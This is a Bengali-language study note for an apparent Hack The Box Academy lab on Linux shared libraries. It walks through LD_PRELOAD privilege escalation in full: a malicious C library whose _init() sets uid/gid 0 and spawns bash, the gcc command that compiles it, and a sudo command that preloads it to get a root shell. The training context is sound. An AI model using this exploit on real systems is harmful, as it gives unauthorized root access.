# Shared Libraries - [LINK](https://academy.hackthebox.com/app/module/51/section/475)


লিনাক্স সিস্টেমে প্রোগ্রামগুলো সাধারণত ডায়নামিক্যালি লিংক করা "শেয়ার্ড অবজেক্ট" (Shared Object) লাইব্রেরি ব্যবহার করে। ডেভেলপাররা একই কোড বারবার লেখার ঝামেলা এড়াতে এই লাইব্রেরিগুলো তৈরি করেন। লিনাক্সে মূলত দুই ধরনের লাইব্রেরি থাকে:

1. **স্ট্যাটিক লাইব্রেরি (Static Libraries - `.a`):** প্রোগ্রাম কম্পাইল হওয়ার সময় এগুলো প্রোগ্রামের স্থায়ী অংশ হয়ে যায় এবং পরে আর পরিবর্তন করা যায় না।
2. **ডায়নামিক লাইব্রেরি (Dynamic Libraries - `.so`):** এগুলো প্রোগ্রামের বাইরে আলাদা ফাইল হিসেবে থাকে এবং প্রোগ্রাম রান করার সময় মেমোরিতে লোড হয়। যেহেতু এগুলো আলাদা ফাইল, তাই হ্যাকাররা অনেক সময় এগুলোকে মডিফাই করে বা নিজেদের বানানো লাইব্রেরি লোড করিয়ে প্রোগ্রামের কন্ট্রোল নিয়ে নিতে পারে।

যেকোনো লিনাক্স বাইনারি রান করার জন্য কী কী ডায়নামিক লাইব্রেরি বা `.so` ফাইল দরকার, তা আমরা `ldd` কমান্ড দিয়ে খুব সহজেই দেখতে পারি:

```bash
htb_student@NIX02:~$ ldd /bin/ls

```

এই কমান্ডের আউটপুট আপনাকে দেখাবে যে `/bin/ls` রান করার জন্য সিস্টেমের কোন কোন লাইব্রেরি (যেমন `libc.so.6`, `libdl.so.2`) লোড করতে হচ্ছে এবং সেগুলো হার্ডডিস্কের কোথায় আছে।

---

## LD_PRELOAD Privilege Escalation (LD_PRELOAD এর অপব্যবহার)

**LD_PRELOAD** হলো লিনাক্সের একটি অত্যন্ত শক্তিশালী এনভায়রনমেন্ট ভ্যারিয়েবল (Environment Variable)। এর কাজ হলো, কোনো প্রোগ্রাম রান হওয়ার সময় সিস্টেমের ডিফল্ট লাইব্রেরিগুলো লোড করার আগেই আপনার বলে দেওয়া একটি নির্দিষ্ট লাইব্রেরিকে সবার আগে লোড করা।

সাধারণত সিকিউরিটির কারণে `sudo` কমান্ড চালানোর সময় লিনাক্স সব এনভায়রনমেন্ট ভ্যারিয়েবল মুছে ফেলে। কিন্তু অ্যাডমিনরা যদি `/etc/sudoers` ফাইলে ভুল করে `env_keep+=LD_PRELOAD` লিখে রাখেন, তবে প্রিভিলেজ এসকালেশন করা সময়ের ব্যাপার মাত্র!

**ধাপ ১: কনফিগারেশন চেক করা**
প্রথমে `sudo -l` দিয়ে চেক করতে হবে আমাদের ইউজারের কী কী পারমিশন আছে:

```bash
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=..., env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart

```

এখানে আমরা দুটি জিনিস দেখতে পাচ্ছি:
১. আমাদের `env_keep+=LD_PRELOAD` পারমিশন আছে (অর্থাৎ sudo করলেও LD_PRELOAD ভ্যারিয়েবলটি থেকে যাবে)।
২. আমরা পাসওয়ার্ড ছাড়াই রুট হিসেবে `apache2` রিস্টার্ট করতে পারব।

যেহেতু `apache2` কোনো GTFOBins নয় এবং এখানে অ্যাবসলিউট পাথ (`/usr/sbin/apache2`) ব্যবহার করা হয়েছে, তাই সাধারণ উপায়ে এটি দিয়ে রুট হওয়া সম্ভব নয়। কিন্তু `LD_PRELOAD` এর কারণে আমরা এখানে একটি ম্যালিশিয়াস লাইব্রেরি ইনজেক্ট করতে পারব।

**ধাপ ২: ম্যালিশিয়াস C লাইব্রেরি তৈরি করা**
আমরা `root.c` নামে একটি ছোট C প্রোগ্রাম লিখব। এর ভেতরে `_init()` নামের একটি ফাংশন থাকবে, যা লাইব্রেরি লোড হওয়ার সাথে সাথেই অটোমেটিক রান হয়।

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
  unsetenv("LD_PRELOAD"); // ইনফিনিট লুপ এড়ানোর জন্য এটি আনসেট করা হয়
  setgid(0); // গ্রুপ আইডি রুট (0) করা হচ্ছে
  setuid(0); // ইউজার আইডি রুট (0) করা হচ্ছে
  system("/bin/bash"); // একটি রুট ব্যাশ শেল ওপেন করা হচ্ছে
}

```

**ধাপ ৩: লাইব্রেরিটি কম্পাইল করা**
আমাদের লেখা C কোডটিকে একটি ডায়নামিক শেয়ার্ড লাইব্রেরি বা `.so` ফাইলে রূপান্তর করার জন্য `gcc` ব্যবহার করব:

```bash
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles

```

**ধাপ ৪: অ্যাটাক এক্সিকিউট করা**
সবশেষে, আমরা `sudo` ব্যবহার করে `apache2` কমান্ডটি চালাব এবং একই সাথে `LD_PRELOAD` এর মাধ্যমে আমাদের বানানো `root.so` ফাইলটিকে সবার আগে লোড করার নির্দেশ দেব:

```bash
htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

```

**কী ঘটবে?**
সিস্টেম যখন রুট পারমিশন নিয়ে `apache2` রিস্টার্ট করতে যাবে, তখন সে সবার আগে আমাদের `root.so` লাইব্রেরিটি মেমোরিতে লোড করবে। আর লোড হওয়ার সাথে সাথেই আমাদের `_init()` ফাংশনটি রান হয়ে যাবে এবং `apache2` রিস্টার্ট হওয়ার আগেই আমরা সরাসরি একটি রুট শেল (Root Shell) পেয়ে যাব!

```bash
# id
uid=0(root) gid=0(root) groups=0(root)

```
